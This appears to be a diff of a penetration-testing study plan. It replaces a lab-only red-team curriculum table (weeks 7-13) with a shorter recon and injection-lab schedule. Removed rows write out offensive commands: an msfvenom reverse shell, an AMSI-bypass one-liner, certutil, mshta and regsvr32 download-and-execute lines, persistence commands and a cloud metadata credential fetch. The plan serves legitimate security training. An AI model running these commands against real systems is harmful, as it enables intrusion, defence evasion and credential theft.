-| 44 | CSC471 Multimedia Tech | Binary exploitation: buffer overflows, shellcode | Python struct/pwntools, gdb, pattern_create, objdump | **VulnHub Brainpan 1 (Buffer Overflow)** - Analyze brainpan.exe with Immunity Debugger/gdb. Crash application finding offset with pattern_create. Calculate offset: `!mona findmsp`. Identify bad characters, find JMP ESP. Generate shellcode: `msfvenom -p windows/shell_reverse_tcp`. Write Python exploit: `payload = "A"*524 + JMP_ESP + "\x90"*16 + shellcode`. Gain shell, escalate to root. Document complete buffer overflow exploitation: fuzzing, offset calculation, bad character identification, shellcode generation with annotated exploit code. |
-| 45 | CSC470 Network Protocols | Bash scripting for reconnaissance automation | bash, awk, sed, grep, parallel, xargs | **Custom Bash Automation Suite** - Write bashreconnaissance script combining: nmap (`nmap -sV -p- $TARGET`), nikto, gobuster, whatweb with parallel execution. Create log parser extracting IPs, URLs, credentials from Apache/auth logs using awk/grep. Build wrapper script automating: subdomain enum, port scan, directory brute-force, vulnerability scan with JSON/CSV output. Test on 3 VulnHub VMs. Create GitHub repo with installation script, documentation, and cron integration. Document bash scripting techniques: argument parsing, error handling, parallel processing with 10+ practical automation examples. |
-| 46 | CSC412 Operations Research | PowerShell for Windows post-exploitation (lab only) | PowerShell, PowerView, Invoke-Obfuscation, Empire | **TryHackMe PowerShell + Custom Scripts** - Complete PowerShell for Pentesters room. Write PowerShell enumeration script checking: users, groups, privileges, AV status, patches, network shares. Create obfuscated reverse shell with Invoke-Obfuscation. Practice Empire agent deployment: stager generation, C2 communication, post-exploitation modules. Test on local Windows lab. Document PowerShell attack techniques: AMSI bypass (`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`), obfuscation methods, and stealth execution with detection evasion strategies. |
-| 47 | CSC413 UNIX Systems | Web scraping and custom reconnaissance tools | Scrapy, BeautifulSoup, Selenium, asyncio, aiohttp | **Advanced Recon Tool Development** - Build async subdomain enumerator combining: certificate transparency logs, DNS brute-force, search engine scraping, archived URLs (Wayback Machine API). Create automated screenshot tool with Selenium capturing 100+ subdomains. Write vulnerability scanner wrapper integrating: nuclei, nmap NSE, testssl.sh with consolidated reporting. Test on permitted bug bounty programs. Document tool architecture: async I/O patterns, API integration, rate limiting, multi-source data correlation with complete tool suite and usage documentation. |
-| 48 | Weekend | Log analysis, SIEM basics, attack detection | grep, awk, Python pandas, Splunk Free, ELK Stack | **TryHackMe Splunk Rooms + Log Analysis Challenges** - Complete Splunk 101, Splunk 2 rooms. Parse Apache/Nginx logs identifying: SQL injection attempts (`%27OR%201=1`), directory traversal (`../../../etc/passwd`), brute-force patterns. Use Python pandas analyzing 1GB+ log files. Create Splunk queries: `index=web sourcetype=access_combined status=200 uri="*admin*" | stats count by clientip`. Write detection rules for common attacks. Document log analysis methodology: regex patterns, attack signatures, correlation rules, SIEM query optimization with detection use cases for web/network attacks. |
-| 49 | Weekend | End-to-end exploitation using custom tooling | All scripting tools, comprehensive automation | **VulnHub Stapler 1 (Complete with Custom Tools)** - Perform full pentest using ONLY custom-written tools: bash recon script discovering FTP (21), SSH (22), DNS (53), HTTP (80, 12380), SMB (139/445). Python exploit for vulnerable service achieving shell. PowerShell/bash privilege escalation enumeration script. Automate entire kill chain. Capture all flags. Write professional 8-page report showcasing tool development skills with code snippets, tool outputs, automation workflow diagrams. Publish sanitized writeup and tools to GitHub demonstrating scripting proficiency to hiring managers. |
+**Day 11** (2.5hr) / (4hr)
+- *Practice:* Build Python script to automate subdomain enumeration + httpx (2hr)
+- *Version control:* Push script to GitHub with README (0.5hr)
+- *(4hr):* Add Slack/Discord notification to script for automation
 
-**Week 7 Cumulative KPIs:** Labs completed: 49 | Reports written: 15 | Tools mastered: 60
+**Day 12** (2.5hr) / (4hr)
+- *Lab:* TryHackMe "Google Dorking" room (1hr)
+- *Practice:* GitHub dorking - find API keys in test repos (use dork collections) (1hr)
+- *Reading:* HackerOne disclosed reports - reconnaissance-based bugs (0.5hr)
+- *(4hr):* Build custom Google Dork list for your target types
 
----
+**Weekend Day 13** (5hr) / (6hr)
+- *Major Project:* Choose 1 VDP program, perform complete reconnaissance (3hr)
+- *Documentation:* Create detailed recon report with findings (2hr)
+- *(6hr):* Submit VDP report or publish sanitized version as writeup
 
-## WEEK 8 (Days 50-56): Cloud Security & Container Basics
+**Weekend Day 14** (5hr) / (6hr)
+- *Lab:* HackTheBox "Lame" (retired, easy) - focus on enumeration process (4hr)
+- *Writeup:* Document methodology, not just flags (1hr)
+- *(6hr):* Complete additional HTB "Legacy" box
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 50 | CSC473 Disaster Recovery | AWS security: S3 buckets, IAM, EC2 misconfigurations | AWS CLI, s3scanner, cloud_enum, Pacu, ScoutSuite | **TryHackMe AWS Room + flAWS.cloud (Levels 1-3)** - Complete TryHackMe AWS fundamentals. Enumerate public S3 buckets: `aws s3 ls s3://bucket-name --no-sign-request`. Complete flAWS Level 1 (public bucket), Level 2 (AWS key in bucket), Level 3 (EC2 metadata `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`). Use cloud_enum discovering exposed resources. Document AWS reconnaissance: S3 enumeration, IAM policy analysis, metadata service exploitation with attack scenarios showing common AWS misconfigurations. |
-| 51 | CSC410 Distributed Systems | Azure security: AD enumeration, storage misconfigurations | Azure CLI, AADInternals, MicroBurst, ROADtools | **TryHackMe Azure Room + Public Azure Testing** - Complete Azure fundamentals room. Enumerate Azure AD: `az ad user list`, `az ad group list`. Use AADInternals extracting tenant information. Test public storage accounts with MicroBurst: `Invoke-EnumerateAzureBlobs -Base company`. Check for anonymous container access. Enumerate Azure resources with az CLI. Document Azure attack surface: tenant enumeration, storage account discovery, RBAC misconfigurations with Azure-specific exploitation techniques and permission escalation paths. |
-| 52 | CSC411 MIS | Google Cloud Platform (GCP) security basics | gcloud CLI, GCPBucketBrute, gcpwn, ScoutSuite | **Free GCP Tier Security Testing** - Set up free GCP account for authorized testing. Enumerate GCP resources: `gcloud projects list`, `gcloud compute instances list`. Scan for public GCS buckets: `gsutil ls gs://bucket-name`. Use GCPBucketBrute finding exposed buckets. Run ScoutSuite security audit: `scout gcp`. Test service account permissions. Document GCP reconnaissance: project enumeration, storage bucket discovery, IAM permission testing with GCP security assessment methodology and common misconfigurations. |
-| 53 | CSC471 Multimedia Tech | Docker security and container escape (lab only) | Docker, docker-bench-security, cdk (Container DevKit), runc exploits | **TryHackMe Docker Room + Container Escape Practice** - Complete Docker security room. Audit Docker: `docker-bench-security.sh` identifying insecure configurations. Test privileged containers: `docker run --privileged -it ubuntu /bin/bash` escaping to host via `/dev/sda1` mount. Exploit exposed Docker socket (`/var/run/docker.sock`). Test container escape via kernel exploits (Dirty COW in container). Document container security: privileged containers, socket exposure, capability abuse, namespace escapes with exploitation techniques and hardening recommendations. |
-| 54 | CSC470 Network Protocols | Kubernetes security and misconfigurations | kubectl, kube-hunter, kubeletctl, kube-bench | **TryHackMe Kubernetes + Local K8s Lab** - Set up Minikube local cluster. Enumerate K8s: `kubectl get pods,services,secrets --all-namespaces`. Run kube-hunter: `kube-hunter --remote https://k8s-cluster`. Test kubelet API: `kubeletctl scan --server https://node:10250`. Check for exposed dashboards. Exploit RBAC misconfigurations. Run kube-bench checking CIS compliance. Document Kubernetes recon: API enumeration, kubelet exploitation, secret extraction, pod privilege escalation with YAML manifests showing vulnerable configurations and secure alternatives. |
-| 55 | Weekend | Cloud IAM privilege escalation attacks | Pacu (AWS), PowerZure (Azure), custom scripts, cloud APIs | **CloudGoat AWS Scenarios (IAM Focus)** - Complete 3 CloudGoat scenarios: IAM privilege escalation (enumerate policies, attach AdministratorAccess), Lambda privilege escalation (modify function code, invoke with elevated permissions), EC2 SSRF (metadata theft via vulnerable web app). Use Pacu modules: `iam__enum_permissions`, `iam__privesc_scan`. Chain vulnerabilities from low-privilege user to admin. Document cloud privilege escalation: IAM policy analysis, assume role chains, service-specific escalation paths with attack graphs showing privilege escalation routes. |
-| 56 | Weekend | Serverless security: Lambda, API Gateway, Functions | AWS CLI, Burp Suite, custom payloads, Lambda Layer backdoors | **CloudGoat Serverless Scenarios** - Exploit vulnerable Lambda functions: function code injection via environment variables, SSRF in Lambda accessing internal services, API Gateway misconfigurations (unauthenticated endpoints). Test Lambda layer backdooring. Exploit function timeout and memory limits for DoS. Extract secrets from Lambda environment variables. Document serverless attack surface: function enumeration, event source mapping, execution role analysis, environment variable disclosure with architecture diagrams showing serverless exploitation chains. |
-
-**Week 8 Cumulative KPIs:** Labs completed: 56 | Reports written: 17 | Tools mastered: 70
-
----
-
-## WEEK 9 (Days 57-63): Wireless, Mobile & IoT Basics
-
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 57 | CSC412 Operations Research | Wi-Fi security: WPA2 handshake capture, cracking | aircrack-ng suite, Wireshark, hcxtools, hashcat | **TryHackMe WiFi Hacking 101 + Personal Network Testing** - Complete WiFi Hacking room. Capture WPA2 handshake on OWNED network: `airodump-ng wlan0mon`, `aireplay-ng -0 5 -a BSSID wlan0mon` (deauth). Convert to hashcat format: `hcxpcapngtool -o hash.hc22000 capture.cap`. Crack: `hashcat -m 22000 hash.hc22000 rockyou.txt`. Analyze 802.11 frames with Wireshark. Document Wi-Fi penetration testing: monitor mode setup, handshake capture, deauthentication attacks, WPA2 cracking with legal disclaimers and authorized testing requirements. |
-| 58 | CSC413 UNIX Systems | Wireless traffic analysis and attack detection | Wireshark, tshark, Kismet, wireless-ids | **Wireless PCAP Analysis Challenges** - Analyze provided PCAP files: identify deauthentication attacks (frame type 0x00, subtype 0x0C), captured WPA handshakes (EAPOL frames), rogue AP indicators (unexpected BSSID). Use tshark filtering: `tshark -r capture.pcap -Y "wlan.fc.type_subtype==0x00c"`. Practice Kismet detecting wireless networks. Identify Evil Twin attacks. Document wireless protocol analysis: 802.11 frame structure, management frame analysis, attack pattern identification with Wireshark display filters and detection signatures. |
-| 59 | CSC473 Disaster Recovery | Android mobile app security testing | apktool, jadx, Frida, adb, Android Studio emulator | **TryHackMe Mobile + InsecureBankv2 APK** - Decompile APK: `apktool d InsecureBankv2.apk`, `jadx -d output InsecureBankv2.apk`. Reverse engineer identifying: hardcoded API keys in `strings.xml`, insecure data storage (`SharedPreferences`), weak crypto (MD5). Set up Android emulator with adb. Find authentication bypass in source code. Exploit deeplink vulnerabilities. Document mobile app reverse engineering: APK structure, manifest analysis, code decompilation, static analysis for secrets with vulnerable code examples and exploitation techniques. |
-| 60 | CSC410 Distributed Systems | Mobile API interception and SSL pinning bypass | Burp Suite, Genymotion emulator, Frida, objection, ProxyDroid | **DVIA/InsecureBankv2 + SSL Pinning Bypass** - Configure Burp Suite with Android emulator: install CA certificate, configure proxy. Intercept mobile API traffic. Bypass SSL pinning with Frida: `frida -U -f com.app.package -l fridascript.js --no-pause`. Use objection: `objection -g com.app.package explore`, `android sslpinning disable`. Exploit insecure API endpoints: missing authentication, IDOR, excessive data exposure. Document mobile API testing: proxy setup, certificate pinning bypass, Frida hooking with JavaScript hooks and API exploitation examples. |
-| 61 | CSC411 MIS | IoT security and firmware analysis | Binwalk, firmware-mod-kit, UART/Serial tools, RouterSploit | **TryHackMe IoT Room + Firmware Analysis** - Complete IoT security room. Extract firmware: `binwalk -e firmware.bin`. Analyze filesystem: identify web interface files, find hardcoded credentials in `/etc/config`, extract encryption keys. Use firmware-mod-kit modifying firmware. Practice RouterSploit: `use scanners/autopwn`, testing router vulnerabilities. Document IoT/embedded testing: firmware extraction, filesystem analysis, credential hunting, UART interface basics with firmware structure analysis and common vulnerability patterns. |
-| 62 | Weekend | Bluetooth security reconnaissance | btscanner, bluez tools (hcitool, l2ping), Bettercap, BlueZ | **Local Bluetooth Enumeration (Owned Devices)** - Enumerate Bluetooth devices on OWNED personal devices: `hcitool scan`, `hcitool info MAC`. Query services: `sdptool browse MAC`. Use Bettercap BLE module: `ble.recon on`, `ble.enum MAC`. Test Bluetooth pairing vulnerabilities. Analyze Bluetooth protocols (RFCOMM, L2CAP). Document Bluetooth reconnaissance: device discovery, service enumeration, pairing attack vectors with protocol analysis and common Bluetooth vulnerabilities (BlueBorne, KNOB attack theory). |
-| 63 | Weekend | RFID/NFC security theory and physical access | Proxmark3 documentation, NFC Tools, MIFARE analysis | **RFID/NFC Security Research Project** - Research RFID/NFC security: HF (13.56MHz) vs LF (125KHz) tags. Study Proxmark3 capabilities: card cloning, replay attacks, MIFARE Classic crypto1 weakness. Review NFC security standards (ISO 14443, ISO 15693). Study physical access control vulnerabilities: weak authentication, cloneable cards, relay attacks. Create comprehensive 10-page documentation: RFID technology overview, attack vectors, Proxmark3 usage guide, MIFARE vulnerabilities, mitigation strategies with threat model for physical access control systems. |
-
-**Week 9 Cumulative KPIs:** Labs completed: 63 | Reports written: 19 | Tools mastered: 82
+**Week 2 Measurable Outcomes:**
+✓ Custom recon automation script in GitHub
+✓ 1 complete recon engagement documented
+✓ 2 HTB boxes or equivalent labs completed
+✓ Understanding of external attack surface mapping
 
 ---
 
-## WEEK 10 (Days 64-70): Red Team Operations & C2 Frameworks (Lab Only)
+### **WEEK 3: OWASP Top 10 - Injection Vulnerabilities**
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 64 | CSC471 Multimedia Tech | Command & Control infrastructure setup (lab only) | Covenant, Sliver, Mythic, redirectors | **TryHackMe C2 Rooms + Local C2 Deployment** - Set up Covenant C2 in lab: install on Ubuntu, configure listeners (HTTP/HTTPS). Generate Grunt implants (PowerShell, binary). Deploy on Windows lab VM establishing C2 channel. Test Covenant tasks: file download, process injection, token theft. Complete TryHackMe C2 fundamentals. Document C2 infrastructure: server setup, listener configuration, implant generation, task execution with network traffic analysis showing C2 communication and OPSEC considerations. |
-| 65 | CSC470 Network Protocols | Payload generation and AV evasion (lab only) | msfvenom, Veil, Invoke-Obfuscation, shellter, GreatSCT | **Advanced Payload Generation Lab** - Generate payloads: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe -o payload.exe`. Encode with shikata_ga_nai. Use Veil: `use evasion/c/meterpreter/rev_tcp.py`. Obfuscate PowerShell: `Invoke-Obfuscation` with encoding, compression, token obfuscation. Test against Windows Defender in isolated lab. Use shellter injecting into legitimate PEs. Document evasion techniques: encoder effectiveness, obfuscation levels, signature analysis with VirusTotal scores and detection comparison. |
-| 66 | CSC412 Operations Research | Living-off-the-land binaries (LOLBins/GTFOBins) | LOLBAS project, GTFOBins, native Windows/Linux binaries | **TryHackMe Red Team Fundamentals + LOLBin Practice** - Execute file operations without suspicious tools: Windows (`certutil -urlcache -f http://IP/file.exe file.exe`), Linux (`curl http://IP/file -o file`). Download/execute: `mshta http://IP/payload.hta`, `regsvr32 /s /u /i:http://IP/file.sct scrobj.dll`. Practice GTFOBins techniques: `find / -exec /bin/bash \;`, `vim -c ':!bash'`. Document LOLBin techniques: file downloads, code execution, privilege escalation using 20+ native binaries with detection considerations. |
-| 67 | CSC413 UNIX Systems | Lateral movement techniques (lab only) | Impacket, CrackMapExec, WMI, PSExec, RDP, evil-winrm | **TryHackMe Red Team Recon + Lateral Movement Lab** - Set up multi-host lab environment (3 Windows VMs). Move laterally: PSExec (`psexec.py domain/user:pass@target`), WMI (`wmiexec.py`), evil-winrm (`evil-winrm -i IP -u user -p pass`). Use CrackMapExec: `crackmapexec smb 192.168.1.0/24 -u user -p pass --shares`. Spray credentials across network. Pass-the-Hash moving between hosts. Document lateral movement: credential reuse, remote execution methods, network propagation with movement timeline and detection indicators. |
-| 68 | CSC473 Disaster Recovery | Persistence mechanisms (lab only) | Registry keys, scheduled tasks, WMI, services, startup folders | **Windows Persistence Lab Practice** - Establish persistence: Registry (`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run`), Scheduled Tasks (`schtasks /create /tn "Update" /tr "C:\payload.exe" /sc onlogon`), WMI Event Subscriptions, Services (`sc create malware binPath= "C:\payload.exe" start= auto`), Startup folder. Create DLL hijacking persistence. Test persistence reboot survival. Document 15+ persistence techniques: registry keys, scheduled tasks, WMI subscriptions with stealth analysis and forensic artifacts left by each method. |
-| 69 | Weekend | AV/EDR evasion techniques (lab only) | AMSITrigger, DefenderCheck, ThreatCheck, custom encoding | **AV Evasion Deep Dive Lab** - Test payloads against Windows Defender. Use AMSITrigger identifying flagged strings: `AMSITrigger.exe -i payload.ps1`. Modify with DefenderCheck: `DefenderCheck.exe payload.exe`. Implement evasion: string concatenation, XOR encoding, AMSI bypass (`[Ref].Assembly.GetType...`), ETW patching. Split malicious code across multiple functions. Obfuscate variable names. Test evasion success. Document evasion techniques: AMSI bypass methods, signature avoidance, behavioral evasion with detection bypass effectiveness analysis. |
-| 70 | Weekend | Red Team engagement simulation | All C2/red team tools, comprehensive OPSEC | **TryHackMe Red Team Capstone or Wreath Network** - Perform full red team engagement: initial reconnaissance (passive OSINT), establish foothold (phishing simulation or web exploit), deploy C2 implant, enumerate domain with BloodHound, move laterally across 3+ systems, escalate to domain admin, establish persistence, exfiltrate "sensitive data". Maintain operational security throughout. Write professional red team engagement report: executive summary, attack timeline, TTPs mapped to MITRE ATT&CK, IOCs, detection gaps with comprehensive engagement documentation showing multi-stage attack. |
+**Learning Goals:**
+- Identify SQL injection manually (no SQLmap initially)
+- Understand command injection contexts
+- Practice XSS (reflected, stored, DOM-based)
 
-**Week 10 Cumulative KPIs:** Labs completed: 70 | Reports written: 21 | Tools mastered: 95
+**Day 15** (2.5hr) / (4hr)
+- *Reading:* PortSwigger Academy - "SQL Injection" theory (1hr)
+- *Lab:* PortSwigger "SQL injection vulnerability in WHERE clause" (1hr)
+- *Practice:* OWASP Juice Shop - find first SQLi flag (0.5hr)
+- *(4hr):* Complete 3 more PortSwigger SQLi labs
 
----
+**Day 16** (2.5hr) / (4hr)
+- *Lab:* PortSwigger "Blind SQL injection" labs (2hr)
+- *Practice:* DVWA (Damn Vulnerable Web App) SQLi module - all levels (0.5hr)
+- *(4hr):* Explore time-based and boolean SQLi manually
 
-## WEEK 11 (Days 71-77): Reporting, Documentation & Portfolio Building
+**Day 17** (2.5hr) / (4hr)
+- *Lab:* TryHackMe "SQL Injection" room (1.5hr)
+- *Practice:* Write Python script to detect basic SQLi (1hr)
+- *(4hr):* Add error-based SQLi detection to script
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 71 | CSC410 Distributed Systems | Professional vulnerability report writing | Markdown, LaTeX, Ghostwriter, Dradis, Obsidian | **Report Writing Mastery** - Review 5 existing lab reports applying professional standards. Rewrite 3 reports with: executive summary (business impact), scope definition, methodology, technical findings (CVSS scored), evidence (annotated screenshots), risk matrix, detailed remediation. Study HackerOne disclosed reports for structure. Create report templates for: web app pentests, network pentests, red team engagements. Document report writing best practices: clarity, reproducibility, impact articulation with before/after examples showing quality improvement. |
-| 72 | CSC411 MIS | CVSS scoring and risk assessment | CVSS calculator (NVD), OWASP Risk Rating, custom risk matrices | **Vulnerability Scoring Deep Dive** - Practice CVSS v3.1 scoring for 15 vulnerabilities: calculate base score (Attack Vector, Complexity, Privileges, User Interaction, Scope, CIA impact), temporal score, environmental score. Compare CVSS with OWASP Risk Rating. Score real findings from Week 1-10 labs. Create risk matrix prioritizing remediation. Document scoring methodology: CVSS metric selection justification, business context integration, risk communication with scoring examples for common vulnerabilities and client-facing risk explanations. |
-| 73 | CSC471 Multimedia Tech | Remediation recommendations and secure coding | OWASP ASVS, CWE/SANS Top 25, secure coding guides | **Remediation Deep Dive** - For 10 vulnerabilities from past labs, write detailed remediation: SQL injection (parameterized queries, ORM usage), XSS (output encoding, CSP), authentication flaws (MFA, session management). Reference OWASP ASVS controls. Provide code examples: vulnerable vs. secure. Create remediation priority matrix. Document remediation best practices: defense-in-depth, least privilege, secure defaults with code-level fixes and architectural improvements for each vulnerability class. |
-| 74 | CSC470 Network Protocols | GitHub portfolio organization and presentation | Git, GitHub, Markdown, GitHub Pages, Jekyll | **GitHub Portfolio Development** - Create professional GitHub structure: `/writeups` (sanitized lab writeups), `/tools` (custom scripts), `/ctf` (CTF solutions), `/certifications`, `/resources`. Write compelling README.md with: skills matrix, tool proficiency, lab completion stats, contact info. Organize writeups with consistent format: target info, reconnaissance, exploitation, post-exploitation, lessons learned. Ensure all sensitive data sanitized. Pin top 6 repositories. Document portfolio best practices: project presentation, code documentation, professional branding with portfolio that demonstrates hireable skills. |
-| 75 | CSC412 Operations Research | Video walkthrough creation for portfolio | OBS Studio, video editing (DaVinci Resolve/Shotcut), screen recording | **Video Demonstration Portfolio** - Record 3 lab walkthroughs (15-20 min each): VulnHub VM walkthrough showing complete exploitation, custom tool demonstration, AD attack chain demonstration. Use OBS Studio: configure scenes, audio levels, screen capture. Edit videos: add intro/outro, annotate important steps, add timestamps. Upload to YouTube (unlisted) or Vimeo. Embed in portfolio. Document video creation: recording setup, editing workflow, effective demonstration techniques with final videos showing technical competency to hiring managers. |
-| 76 | Weekend | Professional resume and LinkedIn optimization | Resume templates, LinkedIn, Canva, Grammarly | **Professional Branding Development** - Create pentester-focused resume: professional summary highlighting skills, technical skills section (tools/languages/frameworks), experience section showing labs as "projects" with metrics (100+ labs completed, 45+ reports written, 115+ tools mastered), education, certifications. Optimize LinkedIn: professional headline, detailed experience, skills endorsements, publish 2 security articles. Request recommendations. Create elevator pitch (30-second intro). Document personal branding: resume quantification, LinkedIn optimization, networking strategies with ATS-friendly resume achieving 90+ score on resume checkers. |
-| 77 | Weekend | Technical blog creation and writeup publication | Hugo/Jekyll, GitHub Pages, Medium, Hashnode | **Security Blog Launch** - Set up technical blog with Hugo or Jekyll on GitHub Pages. Write 3 in-depth sanitized writeups (2000+ words each): VulnHub machine walkthrough with lessons learned, custom tool development tutorial, AD penetration testing methodology. Include: diagrams, code snippets, screenshots, key takeaways. Publish to blog and cross-post to Medium/Dev.to. Create social media presence sharing content. Document content creation: technical writing, audience engagement, SEO optimization with published writeups demonstrating communication skills and technical depth. |
+**Day 18** (2.5hr) / (4hr)
+- *Reading:* Command injection theory - OS command separators (0.5hr)
+- *Lab:* PortSwigger "OS command injection" labs (all) (1.5hr)
+- *Practice:* DVWA Command Injection module (0.5hr)
+- *(4hr):* Find command injection in Juice Shop (use hints if stuck >1hr)
 
-**Week 11 Cumulative KPIs:** Labs completed: 77 | Reports written: 30 | Tools mastered: 100
+**Day 19** (2.5hr) / (4hr)
+- *Reading:* OWASP XSS guide + filter bypass techniques (1hr)
+- *Lab:* PortSwigger "Reflected XSS" labs (1.5hr)
+- *(4hr):* Complete "Stored XSS" and "DOM XSS" lab sections
 
----
+**Weekend Day 20** (5hr) / (6hr)
+- *Major Lab:* TryHackMe "OWASP Top 10" room (complete Injection sections) (3hr)
+- *Practice:* OWASP Juice Shop - find 5 flags related to injection (2hr)
+- *(6hr):* Write detailed XSS payload cheat sheet for portfolio
 
-## WEEK 12 (Days 78-84): Bug Bounty Preparation & Live Practice
+**Weekend Day 21** (5hr) / (6hr)
+- *Practice:* PentesterLab "From SQL Injection to Shell" (web for pentester exercises) (3hr)
+- *Documentation:* Write your first vulnerability report (practice format) (1hr)
+- *Review:* Create personal injection vulnerability checklist (1hr)
+- *(6hr):* Attempt TryHackMe "Injection" room with writeup
 
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 78 | CSC413 UNIX Systems | Bug bounty platforms and disclosed report analysis | HackerOne, Bugcrowd, researcher dashboards | **Bug Bounty Fundamentals** - Create accounts on HackerOne and Bugcrowd. Read 50 disclosed reports analyzing: vulnerability types, reporter methodology, impact articulation, CVSS scores, bounty amounts. Identify patterns in successful reports. Study top researchers (profiles, techniques). Review program policies: scope, out-of-scope, safe harbor. Create bug bounty cheat sheet: common vulnerabilities, quick wins, program selection criteria. Document report analysis: high-impact vulnerabilities, reporting best practices, triage factors with annotated examples of excellent reports. |
-| 79 | CSC473 Disaster Recovery | Scope analysis and target selection strategy | Recon tools, Burp Suite, manual analysis, program comparison | **Bug Bounty Program Recon** - Analyze 10 HackerOne programs: read scope carefully (in-scope domains, asset types), check out-of-scope vulnerabilities, review disclosed reports for duplicates, assess competition level (reports/month), evaluate bounty ranges. Select 3 target programs matching skill level. Create target dossier: scope summary, technology stack, known vulnerabilities, researcher tips. Document program selection: scope clarity, bounty potential, competition analysis with program comparison matrix and target prioritization rationale. |
-| 80 | CSC410 Distributed Systems | Deep reconnaissance for bug bounty targets | Amass, Subfinder, httpx, nuclei, waybackurls, gau | **Advanced Recon on Practice Targets** - Perform deep recon on 2 permitted targets: subdomain enumeration (`amass enum -passive -d domain.com`, `subfinder -d domain.com`), probe live hosts (`httpx -l subdomains.txt`), discover URLs (`waybackurls domain.com`, `gau domain.com`), vulnerability scanning (`nuclei -l live.txt -t exposures/`), technology fingerprinting. Build reconnaissance pipeline script. Identify large attack surface. Document reconnaissance methodology: subdomain discovery, URL extraction, vulnerability scanning with automated recon workflow discovering 500+ subdomains/endpoints. |
-| 81 | CSC411 MIS | Low-hanging fruit identification and quick wins | All web tools, Burp Suite, automated scanners | **Quick Win Vulnerability Hunting** - Focus on high-probability vulnerabilities on practice targets: subdomain takeover (check CNAME pointing to unclaimed services), S3 bucket exposure (`bucket-name.s3.amazonaws.com`), information disclosure (exposed `.git`, `.env`, `backup.sql`), CORS misconfigurations, missing security headers, open redirects. Use automated tools: nuclei templates, custom scripts. Test 50+ subdomains. Document findings systematically. Document quick win hunting: automated discovery, manual verification, impact demonstration with 10+ identified potential vulnerabilities requiring minimal exploitation effort. |
-| 82 | CSC471 Multimedia Tech | Responsible disclosure process and communication | Email templates, HackerOne/Bugcrowd platforms, encryption | **Professional Disclosure Practice** - Draft 5 practice disclosure reports for simulated findings: clear title, vulnerable endpoint, reproduction steps (numbered, specific), impact explanation, severity justification, optional fix suggestion. Practice encryption with PGP for email disclosure. Study disclosure timelines (90-day standard). Review disclosure policies. Handle potential responses: need more info, unable to reproduce, duplicate. Document disclosure best practices: report clarity, professional tone, impact articulation with example reports achieving high quality scores and positive feedback. |
-| 83 | Weekend | Full bug bounty methodology on practice targets | All tools, comprehensive testing | **HackerOne CTF + Practice Programs** - Complete HackerOne CTF challenges (Micro-CMS v1, v2, Postbook, Photo Gallery). Practice on programs with "test" environments or VDPs (Vulnerability Disclosure Programs). Test methodology: reconnaissance → attack surface mapping → vulnerability identification → exploitation → impact proof → report writing. Aim to identify 3-5 valid vulnerabilities. Document complete workflow: time management, tool efficiency, reporting quality with end-to-end bug bounty simulation showing realistic hunting session. |
-| 84 | Weekend | Triaging skills and duplicate prevention | Research tools, Burp Suite Collaborator, reconnaissance | **Triage Mastery and Duplicate Analysis** - Study recent disclosed bugs on target programs understanding what's been found. Research CVE databases, exploit-db, GitHub security advisories for target technologies. Test for known vulnerabilities. Practice distinguishing: valid bug vs. intended behavior, high impact vs. low impact, duplicate vs. unique attack vector. Create triage checklist. Review duplicate reports learning lessons. Document triage methodology: verification steps, impact assessment, duplicate detection with triage decision tree improving report acceptance rate. |
-
-**Week 12 Cumulative KPIs:** Labs completed: 84 | Reports written: 35 | Tools mastered: 105
-
----
-
-## WEEK 13 (Days 85-91): Advanced Practice & Specialization
-
-| Day | Course Unit (4hrs) | Red-Team Focus (6hrs) | Tools | Lab/Target & Daily Objective |
-|-----|-------------|----------------|-------|------------|
-| 85 | CSC470 Network Protocols | Specialization deep-dive: Web/AD/Cloud (choose one) | Specialized toolsets for chosen path | **Advanced Specialization Path** - OPTION A (Web): Complete all remaining PortSwigger labs (Access Control, Business Logic, WebSockets advanced). OPTION B (AD): Build complete AD lab, practice full domain compromise chain. OPTION C (Cloud): Complete all CloudGoat scenarios, practice multi-cloud pentesting. Achieve mastery in chosen specialization. Document specialized knowledge: advanced exploitation techniques, unique attack vectors, specialized tool usage with demonstrated expertise in chosen domain becoming job-ready specialist. |
-| 86 | CSC412 Operations Research | Advanced multi-stage exploitation chains | Custom scripts, multiple tools, pivoting | **VulnHub Advanced Machine: HarryPotter Aragog or Sunset Midnight** - Perform complex exploitation: initial foothold via web exploit, establish persistence, enumerate internal network, discover second host via pivot, exploit internal service, privilege escalate on both machines, chain exploits across hosts. Practice pivoting with SSH tunneling, proxychains, Metasploit routing. Capture all flags. Document advanced exploitation: pivoting techniques, multi-host chains, complex privilege escalation with network diagrams showing attack progression across multiple systems. |
-| 87 | CSC413 UNIX Systems | CTF competition practice with time pressure | All tools, time management, quick thinking | **PicoCTF or Live CTF Competition** - Participate in PicoCTF (ongoing challenges) or weekend CTF competition. Practice categories: web exploitation, binary exploitation, cryptography, forensics, reverse engineering. Solve 15+ challenges within time constraints. Practice: quick reconnaissance, pattern recognition, tool selection, time management, writeup documentation. Document CTF methodology: category-specific approaches, time allocation, hint usage, collaboration with competition performance analysis and lessons learned under pressure. |
-| 88 | CSC473 Disaster Recovery | Complete vulnerable application: 100% exploitation | All web tools, comprehensive testing | **OWASP Juice Shop 100% Completion** - Systematically complete all OWASP Juice Shop challenges (90+ challenges across all difficulty tiers). Categories: broken access control, broken authentication, sensitive data exposure, XXE, broken access control, security misconfiguration, XSS, insecure deserialization, insufficient logging. Achieve 6-star rating. Write comprehensive application security assessment report. Document complete methodology: systematic testing approach, vulnerability chaining, comprehensive coverage with full application penetration test demonstrating thoroughness. |
